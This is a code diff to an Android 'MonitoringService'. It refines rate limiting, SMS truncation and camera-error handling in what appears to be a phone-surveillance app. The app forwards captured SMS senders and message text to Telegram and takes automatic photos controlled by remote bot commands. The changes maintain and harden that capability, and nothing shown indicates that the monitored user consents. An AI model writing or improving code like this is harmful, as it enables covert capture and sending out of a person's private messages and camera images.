@@ -774,7 +774,7 @@ class MonitoringService : Service() {
         }
     }
 
-    private val pairHintAt = java.util.concurrent.atomic.AtomicLong(0L)
+    private val pairHintAt = java.util.concurrent.ConcurrentHashMap<String, Long>()
     private val pairAttemptAt = java.util.concurrent.ConcurrentHashMap<String, Long>()
     private val pingRate = object : LinkedHashMap<String, Long>(64, 0.75f, true) {
         override fun removeEldestEntry(eldest: MutableMap.MutableEntry<String, Long>): Boolean {
@@ -794,17 +794,11 @@ class MonitoringService : Service() {
     private suspend fun sendPairHint(senderId: String) {
         try {
             val now = android.os.SystemClock.elapsedRealtime()
-            if (now - pairHintAt.get() < 3_600_000L) return
-            val nowWall = System.currentTimeMillis()
             try {
-                val meta = getSharedPreferences("boot_meta", android.content.Context.MODE_PRIVATE)
-                val lastWall = meta.getLong("last_pair_hint_wall", 0L)
-                if (lastWall != 0L && nowWall >= lastWall && nowWall - lastWall < 3_600_000L) return
-            } catch (_: Exception) {
-            }
-            pairHintAt.set(now)
-            try {
-                getSharedPreferences("boot_meta", android.content.Context.MODE_PRIVATE).edit().putLong("last_pair_hint_wall", nowWall).apply()
+                val last = pairHintAt[senderId] ?: 0L
+                if (now >= last && now - last < 3_600_000L) return
+                if (pairHintAt.size > 200) pairHintAt.clear()
+                pairHintAt[senderId] = now
             } catch (_: Exception) {
             }
             val token = try {
@@ -2584,8 +2578,9 @@ class MonitoringService : Service() {
             
             smsList.forEach { sms ->
                 appendLine("📞 Number: ${Html.escape(sms.address)}")
-                val body = Html.escape(sms.body).let { it.take(safeCut(it, 200)) } // Limit to 200 chars
-                appendLine("📝 Text: $body${if (sms.body.length > 200) "..." else ""}")
+                val full = Html.escape(sms.body)
+                val body = full.take(safeCut(full, 200))
+                appendLine("📝 Text: $body${if (full.length > body.length) "..." else ""}")
                 appendLine("🔄 Type: ${sms.getTypeString()}")
                 appendLine("⏰ Time: ${formatDate(sms.date)}")
                 appendLine("━━━━━━━━━━━━━━━━")
@@ -3481,7 +3476,7 @@ class MonitoringService : Service() {
             if (isCameraPolicyError(clean)) autoPausePhotosOnPolicyBlock()
             val now = System.currentTimeMillis()
             val last = preferencesManager.lastCameraErrorNotice
-            if (last > 0 && now - last < 30 * 60_000L) return
+            if (last > 0 && now >= last && now - last < 30 * 60_000L) return
             preferencesManager.lastCameraErrorNotice = now
             var hint = cameraFailureHint(clean)
             if (isCameraPolicyError(clean)) hint += " Automatic photos paused for 120 min; send /photointerval 0 to turn auto photos off, or /resume to retry."
@@ -3495,7 +3490,7 @@ class MonitoringService : Service() {
         try {
             val now = System.currentTimeMillis()
             val last = preferencesManager.lastUploadErrorNotice
-            if (last > 0 && now - last < 30 * 60_000L) return
+            if (last > 0 && now >= last && now - last < 30 * 60_000L) return
             preferencesManager.lastUploadErrorNotice = now
             sendToTelegram("⚠️ Photo upload failed ($detail). Will retry automatically.")
         } catch (e: Exception) {
@@ -3558,8 +3553,7 @@ class MonitoringService : Service() {
     private fun isCameraPolicyError(reason: String?): Boolean {
         if (reason == null) return false
         return reason.contains("CAMERA_DISABLED", ignoreCase = true) ||
-            reason.contains("disabled by policy", ignoreCase = true) ||
-            reason.contains("Camera error: 3")
+            reason.contains("disabled by policy", ignoreCase = true)
     }
 
     private fun isCameraDisabledByPolicy(): Boolean {
